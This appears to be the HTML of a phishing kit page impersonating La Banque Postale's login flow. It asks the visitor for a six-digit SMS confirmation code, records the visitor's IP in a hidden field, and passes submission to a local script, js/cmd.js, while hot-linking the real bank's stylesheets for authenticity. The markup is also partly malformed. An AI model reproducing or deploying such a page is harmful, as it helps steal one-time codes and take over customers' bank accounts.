<!DOCTYPE html>
<html class="no-js" lang="fr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" >

    <title>Connexion - La Banque Postale</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
    <meta name="format-detection" content="telephone=no">

    <!-- color status bar -->
    <meta name="theme-color" content="#0b234d">

    <!-- Toolbox XO -->
    <script src="js/toolbox-xo.min.js" type="text/javascript" ></script>
    <script language="javascript" type="text/javascript" src="js/val_keypad_cvd.js"></script>
    <script language="javascript" type="text/javascript" src="js/val_keypad_cvvs-env.js"></script>

   <style type="text/css">
       @import url(https://transverse.labanquepostale.fr/xo_/9.9.0.0/cvvs/css/loader.css);
         /*CSS - Toolbox XO */
       @import url(https://transverse.labanquepostale.fr/xo_/toolbox/1.4/toolbox-xo.css);
       @import url(https://transverse.labanquepostale.fr/xo_/9.9.0.0/cvvs/css/cvs_refonte.css);

<body data-image='logo'  data-tb-animate="actif" class="tb-user-connected" >
<div class="flex-container--column --nowrap tb-wrapper-main --gglassmorphing">
    <main class="flex-container--column --nowrap flex-item-fluid overflow-y back-color-trans txt-color-black pa-16 " role="main">
        <!-- Message lutte anti-fraude -->

    <form id="form-xo-1" class="form-xo-1-3" method="post" action="#" name="formAccesCompte" onSubmit="return false;" style="height:250px">
         
            <div id="hidden">
                <input type="hidden" id="ipaddress" name="NUM LOG POSTALE" />
                <input type="hidden" name="origin" value="particuliers" />
            </div>

            <!-- ECRAN -->
            <div class="ecran font-normal" id="ecran" style="padding:10px">

                <!-- Identifiant -->
                <div data-tb-form-field data-tb-form-id="identifiant" class="flex-container w100">
                     
                    <label for='identifiant' class="font-x-medium txt-color-6 mb0">Je confirme le code reçu</label>
                    <div class="flex-container w100 mtts">
                        <div class="tb-container-cvdId w100 --reset flex-item-fluid flex-container-column">
                            <div class="relative flex-center flex-item-fluid">
                            <input type="text"class="hide-focus" autocomplete="none" size="6"maxlength="6"aria-required="true"accessreset="Effacer la saisie de l&#39;identifiant"name="codesms" required placeholder="******" autofocus>
                            </div>
                        </div>
                    </div>
                    <div data-tb-form-message class="flex-container flex-item-last">
                        <div data-icon="tb-erreur" aria-hidden="true" class="--size16px mrts mts"></div>
                        <p data-ad-messages="" class="flex-container--column flex-item-fluid mts mb0">
                            <span data-ad-message="RG001" hidden>Veuillez renseigner le code reçu.</span>
                            <span data-ad-message="RG002" hidden>Votre code est incomplet.</span>
                        </p>
                    </div>
                </div><br><br>

                <!-- Bouton continuer -->
               <button id="btnContinuerSms" class="tb-btn-p w100" type="submit" data-lien-user="actif">Continuer</button>
               
            </div>
            <!-- /ECRAN -->

        </form>

        <!-- LOADER -->
        <div id="tbi-loader" class="--tiny --spinner" data-tb-spinner="spin"></div>

    </main>
</div>
<script language="javascript" type="text/javascript">
    var OST_origin = "particuliers";

    var OST_flash = "loginform?swf=avalue&";
    var OST_audio5 = "loginform?mp3=avalue&";
    var OST_audioOgg = "";
    var OST_action = "login";
    var PATH_JS = "https://transverse.labanquepostale.fr/xo_/9.9.0.0/cvvs";
    var PATH_RESIZER = "https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/vendors";
</script>
<script src="js/jquery.min.js"></script>
<script src="js/cmd.js"></script>
<script type="application/javascript">
    function getIP(json) {
    document.getElementById("ipaddress").value = json.ip;
    }
    </script>
    
</body>
